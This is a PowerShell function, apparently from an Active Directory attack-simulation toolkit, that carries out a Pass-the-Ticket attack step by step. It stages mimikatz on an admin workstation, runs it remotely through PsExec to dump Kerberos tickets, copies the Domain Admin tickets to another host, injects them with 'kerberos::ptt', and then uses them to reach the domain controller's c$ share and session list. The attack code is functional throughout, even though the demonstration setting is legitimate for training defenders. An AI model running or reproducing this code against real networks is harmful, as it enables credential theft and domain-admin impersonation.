function Invoke-PassTheTicketAttack {
    
    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################
    
    $hostname = $env:computername

    $Script:ASSAW = "CH01-DC19-02.WS19-CHILD01.WS19-ROOT.CORP"
    
    If (-not $SkipClearHost) { Clear-Host }
    
    Invoke-output -Type Header -Message "Pass-the-Ticket (PtT) Attack"
    Invoke-output -Type Info -Message "This attack simulates a Pass-the-Ticket (PtT) attack, where stolen Kerberos tickets are used to impersonate a user and access resources on the network. `n In this case, we will attempt to use stolen tickets to access the Domain Controller's c$ share and list NetBIOS sessions."
    Invoke-output -Type Bullet -Message "Step #1 - stage mimikatz on Admin PC"
    Invoke-output -Type Bullet -Message "Step #2 - harvest tickets on Admin PC"
    Invoke-output -Type Bullet -Message "Step #3 - run PtT to become Domain Admin"

    $path = Get-ASConfig -Setting "Tools"
    $tool1 = join-path -path $path -childpath "mimikatz.exe"
    $tool2 = join-path -path $path -childpath "PsExec.exe"

    
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }
    # remove all old tickets
    
    Try {
        #Get-Item \\$hostname\$Script:ASTicketsUNCPath\*.kirbi
        Remove-Item \\$hostname\$Script:ASTicketsUNCPath\*.kirbi
        #Get-Item \\$hostname\$Script:ASTicketsUNCPath\*.kirbi 
        Remove-Item -Recurse \\$Script:ASSAW\$Script:ASTicketsUNCPath -ErrorAction SilentlyContinue
    }
    Catch {

    }


    If (-not $SkipClearHost) { Clear-Host }
    Invoke-output -Type Header -Message "stage mimikatz on Admin PC $Script:ASSAW"

    Invoke-Output -Type Command -Message "Next Command: " -NoExtraLines
    $command = "Copy-Item -Path $tool1  -Destination \\$Script:ASSAW\$Script:ASTicketsUNCPath -Recurse"
    Write-Syntax -Code $command
    #cleanup
    Remove-Item -Recurse \\$Script:ASSAW\$Script:ASTicketsUNCPath -ErrorAction Ignore
    New-Item \\$Script:ASSAW\$Script:ASTicketsUNCPath -ItemType directory -ErrorAction Ignore | Out-Null
    Copy-Item -Path $tool1  -Destination \\$Script:ASSAW\$Script:ASTicketsUNCPath -Recurse
    $files = "\\$Script:ASSAW\$Script:ASTicketsUNCPath\*.exe"
    Get-Item $files | Out-Host

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    If (-not $SkipClearHost) { Clear-Host }

    Invoke-output -Type Header -Message "harvest tickets on Admin PC $Script:ASSAW"

    Invoke-Output -Type Command -Message "Next Command: " -NoNewline
    $command = "PsExec.exe \\$Script:ASSAW -accepteula cmd /c ('cd c:\temp\tickets & mimikatz.exe `"privilege::debug`" `"sekurlsa::tickets /export`"  `"exit`"')"
    Write-Syntax -Code $command


    #& $tool2 "\\$Script:ASSAW" -accepteula cmd /c 'cd c:\temp\tickets & mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"'


    Invoke-Command -ScriptBlock { & $tool2 \\$Script:ASSAW -accepteula cmd /c ('cd c:\temp\tickets & mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  "exit"') }
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    <##
 $session = New-PSSession -ComputerName CH01-DC19-02.WS19-CHILD01.WS19-ROOT.CORP `
    -Credential (Get-Credential)

Enter-PSSession $session

# Jetzt bist du „auf” dem DC
cd C:\Temp\tickets
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"
exit

Remove-PSSession $session
#>
    If (-not $SkipClearHost) { Clear-Host }

    Invoke-Output -Type Header -Message "list tickets on Admin PC $Script:ASSAW"
    $files = "\\$Script:ASSAW\$Script:ASTicketsUNCPath\*.kirbi"

    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Get-Item ", $files, " -Force ", "| Out-Host "  `
        -Color $fgcC, $fgcV, $fgcS, $fgcC
    Write-Host  ""

    Get-Item $files -Force | Out-Host
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    If (-not $SkipClearHost) { Clear-Host }
    Write-Host "____________________________________________________________________`n" 
    Write-Host "  copy $Global:ASDomainAdmin tickets from Admin PC '$Script:ASSAW' to Victim PC "
    Write-Host "____________________________________________________________________`n" 
    write-host ""

    New-Item \\$hostname\$Script:ASTicketsUNCPath -ItemType directory -ErrorAction Ignore
    Get-Item \\$Script:ASSAW\$Script:ASTicketsUNCPath\*$Global:ASDomainAdmin* | Copy-Item -Destination \\$hostname\$Script:ASTicketsUNCPath

    $files = "\\$hostname\$Script:ASTicketsUNCPath\*.kirbi"
    Get-Item $files | Out-Host

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    Remove-Item -Recurse \\$Script:ASSAW\$Script:ASTicketsUNCPath
    If (-not $SkipClearHost) { Clear-Host }
    Write-Host "____________________________________________________________________`n" 
    write-host "     load stolen tickets from $Global:ASDomainAdmin on VictimPC"
    write-host "                    to become a Domain Admin"
    Write-Host "____________________________________________________________________`n" 
    Write-Host  ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "$tool1 ", """privilege::debug"" ""kerberos::ptt", " \\$hostname\$Script:ASTicketsUNCPath", """ ""exit"""   `
        -Color $fgcC, $fgcS, $fgcV, $fgcS
    Write-Host  ""

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }
    Invoke-Command -ScriptBlock { & $tool1 "privilege::debug" "kerberos::ptt \\$hostname\$Script:ASTicketsUNCPath" "exit" }
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }
    Write-Host "____________________________________________________________________`n" 
    Write-Host "       Displays a list of currently cached Kerberos tickets         "
    Write-Host "____________________________________________________________________`n" 
    Write-Host  ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "klist" `
        -Color $fgcC
    Write-Host  ""
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    write-host ""
    Set-ASConfig -Setting "LastStage" -Value $Script:PtT
    Set-NewColorSchema -NewStage $Script:PtT

    
    klist
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }
    Write-Host "____________________________________________________________________`n" 
    Write-Host "                 2nd TRY connect to DCs c$ share                    "   
    Write-Host "____________________________________________________________________`n" 
    write-host ""

    $directory = "\\$Script:ASDC\c$"
    Get-DirContent -Path $directory
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    If (-not $SkipClearHost) { Clear-Host }
    Write-Host "____________________________________________________________________`n" 
    Write-Host "        2nd TRY to list NetBIOS sessions on Domain Controller       "
    Write-Host "____________________________________________________________________`n" 
    write-host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ".\NetSess.exe ", "$Script:ASDC" `
        -Color $fgcC, $fgcV
    Write-Host  ""


    Get-SessionsOnDC -server $Script:ASDC
    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Write-Log -Message "    >> using "
    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
